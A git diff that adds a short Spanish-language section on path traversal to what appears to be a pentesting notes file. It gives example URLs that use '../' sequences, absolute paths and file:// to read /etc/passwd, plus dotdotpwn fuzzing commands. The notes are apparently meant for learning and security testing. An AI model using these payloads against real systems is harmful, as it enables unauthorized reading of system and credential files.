@@ -254,4 +254,19 @@ Ir a la pestaña Options, en Grep Match poner Clear y escribir el mensaje que mu
 Start attack.
 ```
 
+- Path Traversal: Directorio o Archivo 
+
+Esto hace referencia a cuando en una web se incluye un directorio o archivo por parámetro, podemos modificarlo para llegar hasta un directorio de un nivel superior del sistema , como ser /etc/passwd.  
+Ejemplo:  
+https://domain/xxx/xxx.php?page=xxx   
+https://domain/xxx/xxx.php?page=../../../etc/passwd  
+https://domain/xxx/xxx.php?page=/etc/passwd  
+https://domain/xxx/xxx.php?page=file:///etc/passwd  
+
+```
+dotdotpwn -m payload -h ip -p /root/dt.txt -o unix -f /etc/passwd -d 3 -x 80 -b -k "root"
+dotdotpwn -m payload -h ip -p /root/dt.txt -o unix -f /etc/passwd -d 3 -x 80 -k "root"
+```
+
+
 
